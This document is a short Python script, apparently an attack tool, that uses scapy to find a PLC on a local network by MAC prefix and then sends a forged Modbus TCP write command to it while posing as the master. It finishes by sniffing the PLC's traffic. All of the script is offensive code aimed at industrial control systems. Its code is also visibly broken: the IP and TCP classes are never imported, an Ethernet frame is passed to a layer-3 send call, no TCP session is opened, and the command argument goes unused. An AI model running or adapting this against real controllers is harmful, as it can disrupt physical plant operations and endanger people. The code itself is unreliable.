from scapy.all import ARP, Ether, srp, send, sniff
import os
import time

# Step 1: Discover the PLC's IP address
def discover_plc_ip(network_range="192.168.1.0/24"):
    print(f"Scanning network {network_range} for the PLC...")
    arp = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=2, verbose=0)[0]

    plc_ip = None
    for sent, received in result:
        # Assuming the PLC is the only device with a specific MAC prefix (e.g., 00:1D:9C)
        if received.hwsrc.startswith("00:1D:9C"):
            plc_ip = received.psrc
            print(f"Found PLC at IP: {plc_ip}")
            break

    if not plc_ip:
        print("PLC not found on the network.")
        exit(1)
    return plc_ip

# Step 2: Impersonate the master by sending control messages to the PLC
def impersonate_master(plc_ip, command="START"):
    print(f"Sending command '{command}' to PLC at {plc_ip}...")
    # Craft a fake control message (this depends on the PLC's protocol)
    # Example: Modbus TCP payload for a simple command
    payload = Ether() / IP(dst=plc_ip) / TCP(dport=502) / b"\x00\x00\x00\x00\x00\x06\x01\x06\x00\x01\x00\x01"
    send(payload, verbose=0)
    print("Command sent successfully.")

# Step 3: Capture network traffic meant for the actual master (optional)
def capture_traffic(plc_ip, timeout=10):
    print(f"Capturing traffic to/from {plc_ip} for {timeout} seconds...")
    packets = sniff(filter=f"host {plc_ip}", timeout=timeout)
    print(f"Captured {len(packets)} packets.")
    for packet in packets:
        print(packet.summary())

# Main script
if __name__ == "__main__":
    # Step 1: Find the PLC's IP address
    plc_ip = discover_plc_ip()

    # Step 2: Impersonate the master and send a command
    impersonate_master(plc_ip, command="START")

    # Step 3: Capture traffic (optional)
    capture_traffic(plc_ip, timeout=10)